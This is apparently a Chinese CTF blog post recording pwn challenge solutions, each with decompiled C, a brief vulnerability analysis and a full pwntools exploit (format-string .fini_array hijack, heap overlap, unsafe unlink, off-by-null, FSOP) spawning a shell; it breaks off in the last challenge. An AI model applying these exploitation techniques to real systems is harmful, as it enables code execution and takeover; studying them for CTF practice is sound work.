---
title: "PWNer的历险记"
description: "一位PWNer的做题记录"
pubDate: 2024-12-08
category: pwn
tags: [exercise]
---

## 前言
> 由于笔者想记录一下做过的题，但又不想每次都单独写一篇文章，故汇为一篇。
> 目前文章状态： **长期更新中**

## glibc

### 杂

#### [NISA CTF]shop_pwn

> 来源：NSSCTF

主要逻辑在 `game()` 函数中
```C
void __noreturn game()
{
  int c; // eax
  int i; // [rsp+Ch] [rbp-4h]

  while ( 1 )
  {
    while ( 1 )
    {
      puts("     Welcome to my shop     ");
      puts("+===========================+");
      puts("| No|        | Sell| Recycle|");
      puts("+===+========+=====+========+");
      for ( i = 0; i <= 15; ++i )
      {
        if ( gd[i].v )
          printf("| %d | %-4s   | %3d |   %3d  |\n", i, gd[i].name, gd[i].v, gd[i].kk);
      }                                         //      Welcome to my shop     
                                                // +===========================+
                                                // | No|        | Sell| Recycle|
                                                // +===+========+=====+========+
                                                // | 1 | flag   | 200 |   100  |
                                                // | 2 | pen    | 100 |    99  |
                                                // | 3 | wish   |  50 |     0  |
                                                // +===========================+
      puts("+===========================+");
      puts("1. look bags\n2. buy goods\n3. sale goods");
      printf("> ");
      c = read_int();
      if ( c != 2 )
        break;
      buy();
    }
    if ( c > 2 )
    {
      if ( c == 3 )
      {
        sale();
      }
      else
      {
        if ( c == 4 )
          exit(0);
LABEL_17:
        puts("Invalid!");
      }
    }
    else
    {
      if ( c != 1 )
        goto LABEL_17;
      look();
    }
  }
}
```

##### 漏洞分析
```C
unsigned __int64 sale()
{
  int idx; // [rsp+Ch] [rbp-14h]
  pthread_t newthread; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Which one?\n> ");
  idx = read_int();
  if ( bags[idx] )
  {
    pthread_create(&newthread, 0LL, to_sale, idx);
    puts("Fair prices!");
  }
  else
  {
    puts("R U kidding me?");
  }
  return __readfsqword(0x28u) ^ v3;
}
```
```C
void *__fastcall to_sale(void *a1)
{
  int idx; // eax
  void *result; // rax

  idx = bags[a1];
  if ( idx == 1 )
  {
    money += flag_r;
  }
  else
  {
    if ( idx != 2 )
    {
      printf("Oops???");
      exit(0);
    }
    money += pen_r;
  }
  usleep(50000u);
  result = a1;
  bags[a1] = 0;
  return result;
}
```
创建的子进程会 usleep(50000) ，也就是 sleep(5) .
子进程运行时，父进程包含停止。
说明可以同时开几个子进程，在 **bags[a1]** 未置零时继续卖物品。
一物多卖就是漏洞

##### exp
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

io = process('./pwn')

def sale():
    io.sendline(b'3')
    io.sendline(b'0')

sale()
sale()

io.interactive()
# 然后直接购买flag就行.
```

### stack

#### ez_fmt

> 来源：sally

重命名下函数
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[520]; // [rsp+10h] [rbp-210h] BYREF
  unsigned __int64 v5; // [rsp+218h] [rbp-8h]
  __int64 retaddr; // [rsp+228h] [rbp+8h]

  v5 = __readfsqword(0x28u);
  ret = retaddr;
  init();
  vuln();
  printf("This is a ez_format\n");
  printf("Just pwn it!\n");
  read(0, buf, 0x1F0uLL);
  printf(buf);
  check(retaddr);
  return 0;
}
```
```C
unsigned __int64 vuln()
{
  int v1; // [rsp+Ch] [rbp-34h]
  char buf[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v3; // [rsp+38h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Please enter your name len:\n");
  read(0, buf, 0x10uLL);
  v1 = atoi(buf);
  printf("Please enter your name:\n");
  read(0, unk, v1);
  printf("hello,%s", unk);
  return v3 - __readfsqword(0x28u);
}
```
```C
int printf(const char *format, ...)
{
  __int64 v1; // rdx
  __int64 v2; // rcx
  __int64 v3; // rsi
  __int64 v4; // r8
  __int64 v5; // r9
  int v7; // [rsp+1Ch] [rbp-D4h]
  gcc_va_list arg; // [rsp+28h] [rbp-C8h] BYREF
  __int64 v9; // [rsp+48h] [rbp-A8h]
  __int64 v10; // [rsp+50h] [rbp-A0h]
  __int64 v11; // [rsp+58h] [rbp-98h]
  __int64 v12; // [rsp+60h] [rbp-90h]
  __int64 v13; // [rsp+68h] [rbp-88h]
  void *retaddr; // [rsp+F8h] [rbp+8h]

  va_start(arg, format);
  v3 = va_arg(arg, _QWORD);
  v1 = va_arg(arg, _QWORD);
  v2 = va_arg(arg, _QWORD);
  v4 = va_arg(arg, _QWORD);
  v5 = va_arg(arg, _QWORD);
  v9 = v3;
  v10 = v1;
  v11 = v2;
  v12 = v4;
  v13 = v5;
  arg[0].gp_offset = 8;
  aret = retaddr;
  v7 = vfprintf(_bss_start, format, arg);
  if ( retaddr != aret )
  {
    fwrite("printf() : Error format strings detected!\n", 1uLL, 0x2AuLL, stderr);
    exit(1);
  }
  return v7;
}
```

##### 漏洞分析
很明显的格式化字符串漏洞。
在 init() 函数中，将 .fini_array 设置为可读可写。
ret 变量地址与 unk 相连，可以通过 %s 泄露，从而得到 libc 地址。

修改 .fini_array，重复使用格式化字符串漏洞 ROP。

##### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')
elf = ELF('./ez_fmt_fix')

io = process(elf.path)
gdb.attach(io, 'b *0x401502')

fini = 0x403D90
_start = 0x4010D0

len = 16
payload = b'A' * len
io.recvuntil(b'Please enter your name len:\n')
io.sendline(str(len).encode())
io.recvuntil(b'Please enter your name:\n')
io.send(payload)

libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x29d68
info('libc.address:'+hex(libc.address))

rdi = libc.address + 0x2a205
rsi = libc.address + 0x2bb39
rdx = libc.address + 0x10d37d
info('rdi:'+hex(rdi))
system = libc.symbols['system']
info('system:'+hex(system))
binsh = libc.search(b'/bin/sh').__next__()
info('binsh:'+hex(binsh))

payload = b'%'+str(0x10).encode() + b'c%16$hhn'
payload += b'%'+str(0x30).encode() + b'c%17$hhn'
payload += b'%'+str(0x90).encode() + b'c%18$hhn'
payload += b'%43$p'
payload = payload.ljust(0x40, b'x')
payload += p64(fini+1)+p64(fini+2)+p64(fini)

io.recvuntil(b'Just pwn it!\n')
io.sendline(payload)

io.recvuntil(b'0x')
stack = int(io.recv(12).strip(), 16) - 0x1c8
info('stack:'+hex(stack))

payload = b'/bin/sh\0' * 2 + p64(rdi)
io.recvuntil(b'Please enter your name len:\n')
io.sendline(str(32).encode())
io.recvuntil(b'Please enter your name:\n')
io.sendline(payload)

_rdi1 = rdi & 0xff
_rdi2 = (rdi >> 8) & 0xff
_rdi3 = (rdi >> 16) & 0xff

rdi1 = _rdi1
rdi2 = (_rdi2 + 0x100 - _rdi1) & 0xff
rdi3 = (_rdi3 + 0x100 - _rdi2) & 0xff
info('rdi1:'+hex(rdi1))
info('rdi2:'+hex(rdi2))
info('rdi3:'+hex(rdi3))

_system1 = system & 0xff
_system2 = (system >> 8) & 0xff
_system3 = (system >> 16) & 0xff
_system4 = (system >> 24) & 0xff
_system5 = (system >> 32) & 0xff
_system6 = (system >> 40) & 0xff

system1 = (_system1 + 0x100 - _rdi3) & 0xff
system2 = (_system2 + 0x100 - _system1) & 0xff
system3 = (_system3 + 0x100 - _system2) & 0xff
system4 = (_system4 + 0x100 - _system3) & 0xff
system5 = (_system5 + 0x100 - _system4) & 0xff
system6 = (_system6 + 0x100 - _system5) & 0xff
info('system1:'+hex(system1))
info('system2:'+hex(system2))
info('system3:'+hex(system3))
info('system4:'+hex(system4))
info('system5:'+hex(system5))
info('system6:'+hex(system6))

payload = b'c%31$ln%39$ln'
payload += b'%'+str(rdi1-1).encode() + b'c%28$hhn'
payload += b'%'+str(rdi2).encode() + b'c%29$hhn'
payload += b'%'+str(rdi3).encode() + b'c%30$hhn'
payload += b'%'+str(system1).encode() + b'c%31$hhn'
payload += b'%'+str(system2).encode() + b'c%32$hhn'
payload += b'%'+str(system3).encode() + b'c%33$hhn'
payload += b'%'+str(system4).encode() + b'c%34$hhn'
payload += b'%'+str(system5).encode() + b'c%35$hhn'
payload += b'%'+str(system6).encode() + b'c%36$hhn'
payload += b'%'+str(0x40 + 0x100 - _system6).encode() + b'c%37$hhn'
payload += b'%38$hhn'
payload += b'%'+str(0x10).encode() + b'c%39$hhn'
payload += b'%'+str(0x6d-0x50).encode() + b'c%40$hhn'
payload = payload.ljust(0xa0, b'x')
payload += p64(stack)+p64(stack+1)+p64(stack+2)
payload += p64(stack+0x18)+p64(stack+0x19)+p64(stack+0x1a) + \
    p64(stack+0x1b)+p64(stack+0x1c)+p64(stack+0x1d)
payload += p64(stack+0x9)+p64(stack+0xa)+p64(stack+0x8)
payload += p64(stack+0x10)

io.recvuntil(b'Just pwn it!\n')
io.sendline(payload)

io.interactive()
```

#### ez_fmt_revenge

> 来源：sally

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[520]; // [rsp+10h] [rbp-210h] BYREF
  unsigned __int64 v5; // [rsp+218h] [rbp-8h]
  __int64 retaddr; // [rsp+228h] [rbp+8h]

  v5 = __readfsqword(0x28u);
  ret = retaddr;
  init(argc, argv, envp);
  vuln();
  printf("This is a ez_format\n");
  printf("Just pwn it!\n");
  read(0, buf, 0x1F0uLL);
  printf(buf);
  check(retaddr);
  return 0;
}
```
```C
int vuln()
{
  printf("Please enter your name:\n");
  read(0, qwe, 8uLL);
  return printf("hello,%s", qwe);
}
```

##### 漏洞分析
同样的，劫持 .fini_array。
通过格式化字符串泄露 libc 地址和 stack 地址。

在第二次利用格式化字符串时构造 ROP。

##### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')
elf = ELF('./ez_fmt_revenge')

io = process(elf.path)
gdb.attach(io, 'b *0x40148F')

fini = 0x403D98
_start = 0x4010D0

len = 8
payload = b'A' * len
io.recvuntil(b'Please enter your name:\n')
io.send(payload)

payload = b'%'+str(0x10).encode() + b'c%16$hhn'
payload += b'%'+str(0x30).encode() + b'c%17$hhn'
payload += b'%'+str(0x80).encode() + b'c%18$hhn'
payload += b'%43$p%3$p'
payload = payload.ljust(0x40, b'x')
payload += p64(fini+1)+p64(fini+2)+p64(fini)

io.recvuntil(b'Just pwn it!\n')
io.sendline(payload)

io.recvuntil(b'0x')
stack = int(io.recv(12).strip(), 16) - 0x1c8
info('stack:'+hex(stack))

io.recvuntil(b'0x')
libc.address = int(io.recv(12).strip(), 16) - 0x1036dd
info('libc.address:'+hex(libc.address))

rdi = libc.address + 0x2a205
rsi = libc.address + 0x2bb39
rdx = libc.address + 0x10d37d
info('rdi:'+hex(rdi))
system = libc.symbols['system']
info('system:'+hex(system))
binsh = libc.search(b'/bin/sh').__next__()
info('binsh:'+hex(binsh))

payload = b'/bin/sh\0'
io.recvuntil(b'Please enter your name:\n')
io.send(payload)

_rdi1 = rdi & 0xff
_rdi2 = (rdi >> 8) & 0xff
_rdi3 = (rdi >> 16) & 0xff

rdi1 = _rdi1
rdi2 = (_rdi2 + 0x100 - _rdi1) & 0xff
rdi3 = (_rdi3 + 0x100 - _rdi2) & 0xff
info('rdi1:'+hex(rdi1))
info('rdi2:'+hex(rdi2))
info('rdi3:'+hex(rdi3))

_system1 = system & 0xff
_system2 = (system >> 8) & 0xff
_system3 = (system >> 16) & 0xff
_system4 = (system >> 24) & 0xff
_system5 = (system >> 32) & 0xff
_system6 = (system >> 40) & 0xff

system1 = (_system1 + 0x100 - _rdi3) & 0xff
system2 = (_system2 + 0x100 - _system1) & 0xff
system3 = (_system3 + 0x100 - _system2) & 0xff
system4 = (_system4 + 0x100 - _system3) & 0xff
system5 = (_system5 + 0x100 - _system4) & 0xff
system6 = (_system6 + 0x100 - _system5) & 0xff
info('system1:'+hex(system1))
info('system2:'+hex(system2))
info('system3:'+hex(system3))
info('system4:'+hex(system4))
info('system5:'+hex(system5))
info('system6:'+hex(system6))

payload = b'c%36$ln%42$ln'
payload += b'%'+str(rdi1-1).encode() + b'c%33$hhn'
payload += b'%'+str(rdi2).encode() + b'c%34$hhn'
payload += b'%'+str(rdi3).encode() + b'c%35$hhn'
payload += b'%'+str(system1).encode() + b'c%36$hhn'
payload += b'%'+str(system2).encode() + b'c%37$hhn'
payload += b'%'+str(system3).encode() + b'c%38$hhn'
payload += b'%'+str(system4).encode() + b'c%39$hhn'
payload += b'%'+str(system5).encode() + b'c%40$hhn'
payload += b'%'+str(system6).encode() + b'c%41$hhn'
payload += b'%'+str(0x40 + 0x100 - _system6).encode() + b'c%42$hhn'
payload += b'%43$hhn'
payload += b'%'+str(0x10).encode() + b'c%44$hhn'    
payload += b'%'+str(0xfa-0x50).encode() + b'c%45$hhn'

payload += b'%'+str(_rdi1 + 0x100 - 0xfa).encode() + b'c%46$hhn'
payload += b'%'+str(rdi2).encode() + b'c%47$hhn'
payload += b'%'+str(rdi3).encode() + b'c%48$hhn'

payload = payload.ljust(0xc8, b'x')
payload += p64(stack)+p64(stack+1)+p64(stack+2)
payload += p64(stack+0x18)+p64(stack+0x19)+p64(stack+0x1a) + \
    p64(stack+0x1b)+p64(stack+0x1c)+p64(stack+0x1d)
payload += p64(stack+0x9)+p64(stack+0xa)+p64(stack+0x8)
payload += p64(stack+0x10)
payload += p64(0x404060)+p64(0x404060+1)+p64(0x404060+2)

io.recvuntil(b'Just pwn it!\n')
io.sendline(payload)

io.interactive()
```

> 来源：sally

### heap 2.23

#### babyheap_0ctf_2017

> 来源：BUUOJ

修了一下符号表，主函数内容大致如下
```C
__int64 __fastcall main(char *a1, char **a2, char **a3)
{
    char *ptr; // [rsp+8h] [rbp-8h]

    ptr = init_0();
    while (1)
    {
        menu(); //   puts("1. Allocate");
                //   puts("2. Fill");
                //   puts("3. Free");
                //   puts("4. Dump");
                //   puts("5. Exit");
                //   return printf("Command: ");
        switch (getc())
        {
        case 1LL:
            add(ptr);
            break;
        case 2LL:
            edit(ptr);
            break;
        case 3LL:
            del(ptr);
            break;
        case 4LL:
            show(ptr);
            break;
        case 5LL:
            return 0LL;
        default:
            continue;
        }
    }
}
```

##### 漏洞分析
```C
unsigned __int64 __fastcall edit(book *arr)
{
  unsigned __int64 t; // rax
  int idx; // [rsp+18h] [rbp-8h]
  int size; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  t = getc();
  idx = t;
  if ( t < 0x10 )
  {
    t = arr[t].flags;
    if ( t == 1 )
    {
      printf("Size: ");
      t = getc();
      size = t;
      if ( t > 0 )
      {
        printf("Content: ");
        return editsth(arr[idx].con, size);
      }
    }
  }
  return t;
}
```
在 edit() 函数中，发现 **size** 是用户端输入，可以与 add() 函数中的不同，此处有溢出漏洞。

利用思路：构造堆重叠 -> 泄露 libc -> 劫持 `hook` 为 one_gadget.

##### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF("./libc-2.23.so")
io = process('./babyheap_0ctf_2017')
gdb.attach(io, 'b *$rebase(0x113d)')

def cmd(s: int):
    io.recvuntil(b'Command:')
    io.sendline(str(s).encode())

def add(size: int):
    cmd(1)
    io.recvuntil(b'Size:')
    io.sendline(str(size).encode())

def edit(idx: int, size: int, content: bytes):
    cmd(2)
    io.recvuntil(b'Index:')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Size:')
    io.sendline(str(size).encode())
    io.recvuntil(b'Content:')
    io.send(content)

def delete(idx: int):
    cmd(3)
    io.recvuntil(b'Index:')
    io.sendline(str(idx).encode())

def show(idx: int):
    cmd(4)
    io.recvuntil(b'Index:')
    io.sendline(str(idx).encode())

add(0x10) # 0
add(0x20) # 1
add(0x10) # 2
add(0x60) # 3
add(0x10) # 4

extend = p64(0)+p64(0)
extend += p64(0)+p64(0xc1)
#修改chunk1的size
#0xc1是chunk1,chunk2,chunk3的大小之和(包含chunk头)

edit(0, len(extend), extend)

delete(1)

# 切割出chunk1
# 指针就会写到chunk2的fd和bk上
add(0x20) # 1

# 泄露libc
show(2)
libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3c4b78
info("libc.address: " + hex(libc.address))
one_gadget = libc.address + 0x4526a
malloc_hook = libc.sym['__malloc_hook']
info("malloc_hook: " + hex(malloc_hook))
info("one_gadget: " + hex(one_gadget))

# 清空bins
add(0x10) # 5 to 2
add(0x60) # 6 to 3

# house of spirit
delete(3)

extend = p64(0)+p64(0)
extend += p64(0)+p64(0x71)
extend += p64(malloc_hook-0x23)
edit(2, len(extend), extend)

add(0x60) # 3
add(0x60) # 7 to mallo_hook

con = b'a'*0x13+p64(one_gadget)
edit(7, len(con), con)

# 触发malloc_hook
add(255)

io.interactive()
```

#### [ZJCTF 2019]EasyHeap

> 来源：BUUOJ

```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
    int v3;              // eax
    char buf[8];         // [rsp+0h] [rbp-10h] BYREF
    unsigned __int64 v5; // [rsp+8h] [rbp-8h]

    v5 = __readfsqword(0x28u);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 2, 0LL);
    while (1)
    {
        while (1)
        {
            menu(); //   puts("--------------------------------");
                    //   puts("       Easy Heap Creator       ");
                    //   puts("--------------------------------");
                    //   puts(" 1. Create a Heap               ");
                    //   puts(" 2. Edit a Heap                 ");
                    //   puts(" 3. Delete a Heap               ");
                    //   puts(" 4. Exit                        ");
                    //   puts("--------------------------------");
                    //   return printf("Your choice :");
            read(0, buf, 8uLL);
            v3 = atoi(buf);
            if (v3 != 3)
                break;
            delete_heap();
        }
        if (v3 > 3)
        {
            if (v3 == 4)
                exit(0);
            if (v3 == 4869)
            {
                if ((unsigned __int64)magic <= 0x1305)
                {
                    puts("So sad !");
                }
                else
                {
                    puts("Congrt !");
                    l33t();
                }
            }
            else
            {
            LABEL_17:
                puts("Invalid Choice");
            }
        }
        else if (v3 == 1)
        {
            create_heap();
        }
        else
        {
            if (v3 != 2)
                goto LABEL_17;
            edit_heap();
        }
    }
}
```

##### 漏洞分析
```C
unsigned __int64 edit_heap()
{
  unsigned int v1; // [rsp+4h] [rbp-1Ch]
  __int64 v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 >= 0xA )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    printf("Size of Heap : ");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    printf("Content of heap : ");
    read_input(heaparray[v1], v2);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

edit_heap() 函数会请求输入**size**，故存在溢出。

思路：通过 *unsafe unlink* ，修改 heap 地址数组，劫持 atoi() 为 system()

##### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./easyheap')
libc = ELF('./libc-2.23.so')

io = process('./easyheap')
# gdb.attach(io, 'b *0x400C8C')

def cmd(c: int):
    io.recvuntil(b'Your choice :')
    io.sendline(str(c).encode())

def add(size: int, content: str):
    cmd(1)
    io.recvuntil(b'Size of Heap : ')
    io.sendline(str(size).encode())
    io.recvuntil(b'Content of heap:')
    io.send(content)

def edit(idx: int, size: int, content: str):
    cmd(2)
    io.recvuntil(b'Index :')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Size of Heap : ')
    io.sendline(str(size).encode())
    io.recvuntil(b'Content of heap : ')
    io.send(content)

def delete(idx: int):
    cmd(3)
    io.recvuntil(b'Index :')
    io.sendline(str(idx).encode())

arr = 0x6020E0

add(0x20, 'a' * 0x20)  # 0
add(0x30, 'b' * 0x30)  # 1
add(0x80, 'c' * 0x80)  # 2
add(0x10, 'd' * 0x10)  # 3

# unlink
extend = p64(0)+p64(0x31)
extend += p64(arr-0x10)+p64(arr-0x8)
extend = extend.ljust(0x30, b'a')
extend += p64(0x30)+p64(0x90)
edit(1, len(extend), extend)
delete(2)

# 修改指针
edit(1, 0x20, p64(0)*2+p64(elf.got['atoi']))

# 修改atoi为system
edit(0, 0x8, p64(elf.plt['system']))

io.sendline(b'/bin/sh')

io.interactive()
```

#### little game

> 来源：JNCTF

```C
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  init_0();
  q();
  puts("======================");
  puts("This is a little game.");
  puts("======================");
  while ( 1 )
  {
    menu();                                     //   v1 = __readfsqword(0x28u);
                                                //   puts("1.Get a new chunk.");
                                                //   puts("2.Delete a chunk.");
                                                //   puts("3.Show a chunk.");
                                                //   puts("4.Edit a chunk.");
                                                //   puts("5.Exit.");
                                                //   puts("What's your choice?");
    switch ( getc() )
    {
      case 1:
        add();
        break;
      case 2:
        del();
        break;
      case 3:
        show();
        break;
      case 4:
        edit();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid choice!");
        break;
    }
  }
}
```

##### 漏洞分析
```C
unsigned __int64 edit()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index:");
  v1 = getc();
  if ( v1 >= 0xA )
  {
    puts("Out of index!");
    exit(0);
  }
  if ( arr[v1] )
  {
    printf("Content:");
    bug(arr[v1], size_list[v1]);
    puts("OK!");
    fflush(stdout);
  }
  return __readfsqword(0x28u) ^ v2;
}
```
```C
unsigned __int64 __fastcall bug(void *a1, int a2)
{
  int v3; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = read(0, a1, a2);
  if ( v3 <= 0 )
  {
    puts("Error");
    exit(-1);
  }
  *(a1 + v3) = 0;                               // off-by-null
  return __readfsqword(0x28u) ^ v4;
}
```
一个很典型的 off-by-null .
由于 init() 函数中有 mallopt(1, 0);
故本题无法使用 fast bin .
进而想到使用 *unsorted bins attack* 进行 *FSOP*.

##### exp
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

libc = ELF('./libc-2.23.so')

io = process('./little_game')
gdb.attach(io, '''b *$rebase(0x12F9)''')

def cmd(c):
    io.recvuntil(b'What\'s your choice?')
    io.sendline(str(c).encode())

def add(size: int):
    cmd(1)
    io.recvuntil(b'Size:')
    io.sendline(str(size).encode())

def delete(idx: int):
    cmd(2)
    io.recvuntil(b'Index:')
    io.sendline(str(idx).encode())

def show(idx: int):
    cmd(3)
    io.recvuntil(b'Index:')
    io.sendline(str(idx).encode())

def edit(idx: int, content):
    cmd(4)
    io.recvuntil(b'Index:')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Content:')
    io.send(content)

add(0x88)  # 0
'''
作溢出用
'''

add(0x460)  # 1
add(0x20)  # 2
'''
防止delete(1)时,chunk_1被top chunk合并
'''

edit(1, b'a'*0x3f0+p64(0x400))
'''
作铺垫
'''

delete(1)
'''
放入unsorted bin
并在chunk2的prev_size处填入0x470
'''

edit(0, b'a'*0x88)
'''
off by null
'''

add(0x20)  # 1
add(0x2f0)  # 3
add(0xb0)  # 4
'''
申请出0x400总的chunk
'''

edit(1, b'a'*8)
'''
填充chunk_1的fd
'''

show(1)
libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3c4f00
info('libc_base: ' + hex(libc.address))
one_gadget = libc.address + 0x4526a
info('one_gadget: ' + hex(one_gadget))
system = libc.sym['system']
info('system: ' + hex(system))
IO_list_all = libc.address + 0x3c5520
info('IO_list_all: ' + hex(IO_list_all))

io.recvn(2)
heap_addr = u64(io.recv(6).ljust(8, b'\x00')) - 0x90
info('heap_addr: ' + hex(heap_addr))
'''
泄露出了libc和heap地址
'''

delete(1)
delete(2)
'''
top chunk合并
'''

add(0x490) # 1
edit(1, b'a'*0x20+p64(0)+p64(0x301))
delete(3)
'''
准备unsorted bin attack
'''

vtable = p64(system)*4
vtable_addr = heap_addr + 0xa0
extend = vtable
extend += b'/bin/sh\0'+p64(0x61)
extend += p64(0)+p64(IO_list_all-0x10)
extend += p64(0)+p64(1)
extend += p8(0)*0xa8
extend += p64(vtable_addr)
edit(1, extend)
'''
伪造IO_file结构体和vtable
'''

add(0x100)

io.interactive()
```

#### asis2016_b00ks
```C
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int c; // [rsp+1Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  wel();
  rename();
  while ( 1 )
  {
    c = getc();                                 //   puts("\n1. Create a book");
                                                //   puts("2. Delete a book");
                                                //   puts("3. Edit a book");
                                                //   puts("4. Print book detail");
                                                //   puts("5. Change current author name");
                                                //   puts("6. Exit");
                                                //   printf("> ");
    if ( c == 6 )
      break;
    switch ( c )
    {
      case 1:
        add();
        break;
      case 2:
        del();
        break;
      case 3:
        edit();
        break;
      case 4:
        show();
        break;
      case 5:
        rename();
        break;
      default:
        puts("Wrong option");
        break;
    }
  }
  puts("Thanks to use our library software");
  return 0LL;
}
```

##### 漏洞分析
```C
__int64 rename()
{
  printf("Enter author name: ");
  if ( !readsth(name, 32) )
    return 0LL;
  printf("fail to read author_name");
  return 1LL;
}
```
```C
__int64 __fastcall readsth(_BYTE *addr, int a2)
{
  int i; // [rsp+14h] [rbp-Ch]

  if ( a2 <= 0 )
    return 0LL;
  for ( i = 0; ; ++i )
  {
    if ( read(0, addr, 1uLL) != 1 )
      return 1LL;
    if ( *addr == 10 )
      break;
    ++addr;
    if ( i == a2 )
      break;
  }
  *addr = 0;                                    // off by null
  return 0LL;
}
```
```C
int show()
{
  lib *v0; // rax
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 19; ++i )
  {
    v0 = arr[i];
    if ( v0 )
    {
      printf("ID: %d\n", arr[i]->flag);
      printf("Name: %s\n", arr[i]->name);
      printf("Description: %s\n", arr[i]->book);
      LODWORD(v0) = printf("Author: %s\n", name);
    }
  }
  return v0;
}
```

rename() 中存在 off by null.
而 name 与 arr 数组相邻，刚好能溢出。
将第一个 chunk_ptr 的最低字节覆盖为 \x00 。
show() 中也可通过字符串未截断而泄露 heap 地址

##### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc-2.23.so')

io = process('./b00ks')
gdb.attach(io, 'b *$rebase(0x1240)')

# addr = 'node5.buuoj.cn:26678'.split(':')
# io = remote(addr[0], addr[1])

def cmd(c: int):
    io.recvuntil(b'> ')
    io.sendline(str(c).encode())

def add(nsize: int, name: bytes, csize: int, content: bytes):
    cmd(1)
    io.recvuntil(b'Enter book name size:')
    io.sendline(str(nsize).encode())
    io.recvuntil(b'Enter book name (Max 32 chars):')
    io.sendline(name)
    io.recvuntil(b'Enter book description size:')
    io.sendline(str(csize).encode())
    io.recvuntil(b'Enter book description: ')
    io.sendline(content)

def delete(idx: int):
    cmd(2)
    io.recvuntil(b'Enter the book id you want to delete: ')
    io.sendline(str(idx).encode())

def edit(idx: int, content: bytes):
    cmd(3)
    io.recvuntil(b'Enter the book id you want to edit: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Enter new book description: ')
    io.sendline(content)

def show():
    cmd(4)

def rename():
    cmd(5)
    io.recvuntil(b'Enter author name: ')
    io.sendline(b'a' * 0x1f + b'x')

io.recvuntil(b'Enter author name: ')
io.sendline(b'a' * 0x1f + b'x')

add(0xd0, b'a' * 0x10, 0x20, b'a' * 0x10)  # 0
'''
0xd0 是为了保证第二个 chunk 的地址最低一字节是 00
'''

add(0x80, b'a' * 0x10, 0x10, b'a' * 0x10)  # 1
add(0x20, b'a' * 0x10, 0x20, b'a' * 0x10)  # 2
'''
防止合并
'''

'''
泄露 heap 地址
'''
show()
io.recvuntil(b'aaax')
heap = u64(io.recv(6) + b'\x00\x00') - 0x30
info('heap: ' + hex(heap))

content = p64(1) + p64(heap) + p64(heap+0x1a0) + p64(0xffff)
edit(1, content)

rename()
'''
修改 arr 中的 chunk 指针
'''

'''
泄露 libc 地址
'''
delete(2)

content = p64(3) + p64(heap+0x60) + p64(heap+0x60) + p64(0x20)
edit(1, content)

show()
libc.address = u64(io.recvuntil(b'\x7f')[-6:] + b'\x00\x00') - 0x3c4b78   
info('libc: ' + hex(libc.address))
free_hook = libc.sym['__free_hook']
one_gadget = libc.address + 0x4526a
info('free_hook: ' + hex(free_hook))
info('one_gadget: ' + hex(one_gadget))

'''
任意地址写， 接触 free_hook
'''
content = p64(3) + p64(free_hook) + p64(free_hook) + p64(0x20)
edit(1, content)
edit(3, p64(one_gadget))

'''
触发 one_gadget
'''
delete(3)

io.interactive()

```

#### hitcontraining_bamboobox
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  func_list *lst; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  lst = malloc(0x10uLL);
  lst->hello = hello_message;
  lst->bye = goodbye_message;
  lst->hello();
  while ( 1 )
  {
    menu();                                     //   puts("----------------------------");
                                                //   puts("Bamboobox Menu");
                                                //   puts("----------------------------");
                                                //   puts("1.show the items in the box");
